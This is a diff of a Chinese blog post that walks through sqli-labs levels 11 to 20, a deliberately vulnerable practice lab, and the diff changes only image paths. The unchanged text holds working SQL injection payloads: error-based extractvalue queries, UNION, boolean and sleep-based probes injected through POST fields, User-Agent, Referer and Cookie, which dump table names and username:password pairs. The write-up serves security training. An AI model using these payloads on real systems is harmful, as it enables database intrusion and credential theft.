@@ -500,70 +500,70 @@
                 <h1 id="sqli-labs通关（11-20）"><a href="#sqli-labs通关（11-20）" class="headerlink" title="sqli-labs通关（11-20）"></a>sqli-labs通关（11-20）</h1><span id="more"></span>
 
 <h2 id="第十一关（基于错误的POST单引号字符型注入）"><a href="#第十一关（基于错误的POST单引号字符型注入）" class="headerlink" title="第十一关（基于错误的POST单引号字符型注入）"></a><strong>第十一关（基于错误的POST单引号字符型注入）</strong></h2><p>输入admin admin登录 抓包，发送到repeater模块</p>
-<p><img src="./sqli-labs11-20/clipboard.jpg" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/clipboard.jpg" alt="img"></p>
 <p>在repeater模块中通过修改POST参数进行注入</p>
 <p><strong>方法一extractvalue测试payload</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and 1=1--+&amp;passwd=admin&amp;submit=Submit  //能登陆<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/1.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/1.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and 1=2--+&amp;passwd=admin&amp;submit=Submit  //不能登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/2.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/2.png" alt="img"></p>
 <p>说明注入生效，存在<strong>报错型注入</strong></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">payload= 
 uname=admin' and extractvalue(1,concat(0x7e,(select database() )))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/3.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/3.png" alt="img"></p>
 <p><strong>爆表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">payload=
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() )))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/4.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/4.png" alt="img"></p>
 <p>只可以看到一部分表，我们使用 not in 就可以看到其他表了</p>
 <pre class="line-numbers language-none"><code class="language-none">payload= 
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in ('emails'))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/5.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/5.png" alt="img"></p>
 <p>可以看到没有多余的表了</p>
 <p><strong>爆列名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">payload= 
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/6.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/6.png" alt="img"></p>
 <p>我们用同样的方法查看剩余的列</p>
 <pre class="line-numbers language-none"><code class="language-none">payload=
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'  and column_name not in ('user','CURRENT_CONNECTIONS','TOTAL_CONNECTIONS'))))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/7.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/7.png" alt="img"></p>
 <p><strong>爆字段</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">payload= 
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/8.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/8.png" alt="img"></p>
 <p>同样可以查看剩余字段</p>
 <pre class="line-numbers language-none"><code class="language-none">payload=
 uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you','Angelina'))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/9.png"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/9.png"></p>
 <p><strong>方法二联合查询union select</strong></p>
 <p>uname是错误的才能显示联合查询内容</p>
 <p>uname=0’ union select 1,2–+</p>
-<p><img src="./sqli-labs11-20/10.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/10.png" alt="img"></p>
 <p>然后就是基本的联合查询</p>
 <h2 id="第十二关（基于错误的双引号POST字符型变形注入）"><a href="#第十二关（基于错误的双引号POST字符型变形注入）" class="headerlink" title="第十二关（基于错误的双引号POST字符型变形注入）"></a><strong>第十二关（基于错误的双引号POST字符型变形注入）</strong></h2><p>我们输入”报错说明可能存在注入，但是输入–+后仍然报错</p>
-<p><img src="./sqli-labs11-20/11.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/11.png" alt="img"></p>
 <p>后经过尝试  发现为”)闭合</p>
-<p><img src="./sqli-labs11-20/12.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/12.png" alt="img"></p>
 <p>方法同十一关</p>
 <h2 id="第十三关（POST单引号变形双注入）"><a href="#第十三关（POST单引号变形双注入）" class="headerlink" title="第十三关（POST单引号变形双注入）"></a><strong>第十三关（POST单引号变形双注入）</strong></h2><p>经过尝试发现闭合符为’)</p>
-<p><img src="./sqli-labs11-20/13.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/13.png" alt="img"></p>
 <p>发现没有登陆成功返回信息，判断需要盲注</p>
 <p><strong>方法一报错注入</strong></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin') and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/14.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/14.png" alt="img"></p>
 <p>接下来就是爆表名、爆列名、爆字段</p>
 <p><strong>方法二时间延迟型注入</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin') and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -576,81 +576,81 @@ uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,p
 <p>……</p>
 <p><strong>方法二时间延迟型盲注</strong></p>
 <h2 id="第十五关（基于bool型-时间延迟型单引号POST盲注）"><a href="#第十五关（基于bool型-时间延迟型单引号POST盲注）" class="headerlink" title="第十五关（基于bool型/时间延迟型单引号POST盲注）"></a><strong>第十五关（基于bool型/时间延迟型单引号POST盲注）</strong></h2><p>经过尝试 发现为单引号’闭合</p>
-<p><img src="./sqli-labs11-20/15.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/15.png" alt="img"></p>
 <p><strong>方法一布尔型</strong></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select database()),8)='security' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/16.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/16.png" alt="img"></p>
 <p><strong>爆表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/17.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/17.png" alt="img"></p>
 <p><strong>爆列名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='username'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/18.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/18.png" alt="img"></p>
 <p><strong>爆字段</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and left((select username from security.users order by id limit 0,1),5)='dumb'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/19.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/19.png" alt="img"></p>
 <p>密码同上</p>
 <p><strong>方法二时间延迟型盲注</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">uname=admin' and sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/20.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/20.png" alt="img"></p>
 <p>出现明显延迟，步骤不在赘述</p>
 <h2 id="第十六关（基于bool型-时间延迟型双引号POST盲注）"><a href="#第十六关（基于bool型-时间延迟型双引号POST盲注）" class="headerlink" title="第十六关（基于bool型/时间延迟型双引号POST盲注）"></a><strong>第十六关（基于bool型/时间延迟型双引号POST盲注）</strong></h2><p>经过尝试闭合符为双引号加括号”)</p>
-<p><img src="./sqli-labs11-20/21.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/21.png" alt="img"></p>
 <p>方法同上</p>
 <h2 id="第十七关（基于错误的更新查询POST注入）"><a href="#第十七关（基于错误的更新查询POST注入）" class="headerlink" title="第十七关（基于错误的更新查询POST注入）"></a><strong>第十七关（基于错误的更新查询POST注入）</strong></h2><p>对uname做了check_input的处理，处理如下 在magic_quotes_gpc = On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。 stripslashes()删除由 addslashes() 函数添加的反斜杠 ctype_digit()判断是不是数字，是数字就返回true，否则返回false mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。 intval()   整型转换 </p>
 <p>我靠做了这么多花里胡哨的过滤，你怎么没对password也搞一次？</p>
 <p>针对password爆破 <strong>报错注入</strong></p>
 <p>发现闭合符为单引号’</p>
-<p><img src="./sqli-labs11-20/22.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/22.png" alt="img"></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">admin' and extractvalue(1,concat(0x7e,(select database())))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/23.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/23.png" alt="img"></p>
 <p><strong>爆表名</strong></p>
 <p><strong>此payload中，passwd后必须是数字，输入字母就会出现如下问题，经过尝试发现，但不知道原理</strong></p>
-<p><img src="./sqli-labs11-20/24.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/24.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/25.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/25.png" alt="img"></p>
 <p><strong>爆列名</strong> </p>
 <pre class="line-numbers language-none"><code class="language-none">1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema. columns where table_name='users' and column_name not in ('user','CURRENT_CONNECTIONS','TOTAL_CONNECTIONS'))))--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/26.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/26.png" alt="img"></p>
 <p><strong>不再赘述</strong></p>
-<h2 id="第十八关（基于错误的用户代理，头部POST注入）"><a href="#第十八关（基于错误的用户代理，头部POST注入）" class="headerlink" title="第十八关（基于错误的用户代理，头部POST注入）"></a><strong>第十八关（基于错误的用户代理，头部POST注入）</strong></h2><p><img src="./sqli-labs11-20/27.png" alt="img"></p>
+<h2 id="第十八关（基于错误的用户代理，头部POST注入）"><a href="#第十八关（基于错误的用户代理，头部POST注入）" class="headerlink" title="第十八关（基于错误的用户代理，头部POST注入）"></a><strong>第十八关（基于错误的用户代理，头部POST注入）</strong></h2><p><img src="/2021/03/20/sqli-labs11-20/27.png" alt="img"></p>
 <p>我们看到有user-angent回显，猜测注入点在此处。</p>
 <p>经过尝试，发现此题相对于上题把username和password都做了check，所以我们就把目标放user-angent。</p>
 <p>经尝试发现闭合符为单引号’</p>
-<p><img src="./sqli-labs11-20/28.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/28.png" alt="img"></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">'  and extractvalue(1,concat(0x7e,(select database()))) and'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/29.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/29.png" alt="img"></p>
 <p>不在赘述</p>
 <h2 id="第十九关（基于头部的referer-POST报错注入）"><a href="#第十九关（基于头部的referer-POST报错注入）" class="headerlink" title="第十九关（基于头部的referer POST报错注入）"></a><strong>第十九关（基于头部的referer POST报错注入）</strong></h2><p>可以看出回显是referer字段，所以我们判断注入点在这；经过尝试，发现闭合符为单引号’</p>
-<p><img src="./sqli-labs11-20/30.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/30.png" alt="img"></p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">' and extractvalue(1,concat(0x7e,(select database()))) and'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/31.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/31.png" alt="img"></p>
 <p>不再赘述</p>
 <h2 id="第二十关（基于错误的cookie头部POST注入）"><a href="#第二十关（基于错误的cookie头部POST注入）" class="headerlink" title="第二十关（基于错误的cookie头部POST注入）"></a><strong>第二十关（基于错误的cookie头部POST注入）</strong></h2><p>登陆后界面</p>
-<p><img src="./sqli-labs11-20/32.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/32.png" alt="img"></p>
 <p>看到存在字段cookie，那我们就尝试在这里注入</p>
 <p>抓个包看下</p>
-<p><img src="./sqli-labs11-20/33.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/33.png" alt="img"></p>
 <p>看到 cookie：uname=admin  我们就在这里进行注入</p>
 <p>经尝试发现闭合符为单引号’</p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">admin' and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs11-20/34.png" alt="img"></p>
+<p><img src="/2021/03/20/sqli-labs11-20/34.png" alt="img"></p>
 <p>不再赘述</p>
 
                 
